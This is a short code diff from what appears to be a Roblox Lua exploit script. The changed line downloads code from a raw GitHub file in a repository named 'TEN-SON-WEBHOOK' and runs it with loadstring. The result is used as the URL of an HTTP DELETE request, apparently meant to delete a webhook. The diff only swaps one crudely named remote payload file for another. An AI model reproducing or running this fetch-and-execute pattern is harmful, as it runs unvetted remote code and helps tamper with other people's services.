@@ -20,6 +20,6 @@ req({
 
 
 req({
-    Url = loadstring(game:HttpGet("https://raw.githubusercontent.com/Prajon/TEN-SON-WEBHOOK/main/DEVIL-Hub-BookDickHead"))(),
+    Url = loadstring(game:HttpGet("https://raw.githubusercontent.com/Prajon/TEN-SON-WEBHOOK/main/DEVIL-Hub-BookPussy"))(),
     Method = "DELETE"
 })
